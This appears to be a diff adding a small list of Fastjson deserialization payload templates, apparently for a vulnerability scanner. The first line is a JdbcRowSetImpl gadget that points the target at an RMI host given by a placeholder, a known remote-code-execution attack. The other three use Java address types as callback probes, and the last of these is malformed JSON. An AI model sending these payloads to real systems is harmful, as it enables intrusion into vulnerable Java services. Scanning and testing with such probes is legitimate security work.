@@ -1,0 +1,4 @@
+{"b":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://%s/TouchFile","autoCommit":true}}
+{"b":{"@type":"java.net.Inet4Address","val":"%s"}}
+{"b":{"@type":"java.net.Inet6Address","val":"%s"}}
+{"b":{"@type":"java.net.InetSocketAddress"{"address":,"val":"%s"}}}
